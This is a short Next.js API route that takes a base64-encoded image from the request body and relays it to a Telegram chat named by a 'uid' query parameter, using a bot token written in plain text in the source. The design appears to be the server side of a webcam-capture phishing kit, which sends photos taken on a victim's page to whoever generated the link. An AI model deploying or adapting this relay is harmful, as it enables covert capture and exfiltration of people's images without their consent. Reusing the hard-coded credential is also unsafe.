// pages/api/post.js
import fetch from "node-fetch";
import FormData from "form-data";

const BOT_TOKEN = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");

  const { cat } = req.body;
  const uid = req.query.uid;

  if (!cat || !uid) return res.status(400).send("Missing data");

  try {
    const base64Data = cat.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    if (buffer.length < 1000) {
      return res.status(400).send("Image too small or corrupted");
    }

    const form = new FormData();
    form.append("chat_id", uid);
    form.append("photo", buffer, {
      filename: "photo.png",
      contentType: "image/png",
    });

    const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    const data = await response.json();

    if (!data.ok) {
      console.error("Telegram error:", data);
      return res.status(500).send("Telegram failed");
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Server error:", err);
    res.status(500).send("Internal server error");
  }
}
